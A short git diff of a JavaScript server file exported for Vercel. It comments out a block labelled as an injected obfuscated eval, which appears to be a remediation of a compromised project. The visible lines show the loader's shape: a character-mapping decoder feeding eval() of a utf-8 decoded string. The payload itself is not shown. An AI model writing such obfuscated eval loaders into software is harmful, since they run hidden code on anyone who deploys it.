@@ -494,6 +494,7 @@ if (process.env.NODE_ENV !== 'production') {
 
 // Exportar para Vercel
 export default app;
+/* Removed injected obfuscated eval block
 const s = (v) =>
   [...v]
     .map(
@@ -514,3 +515,4 @@ eval(
     ),
   ).toString("utf-8"),
 );
+*/
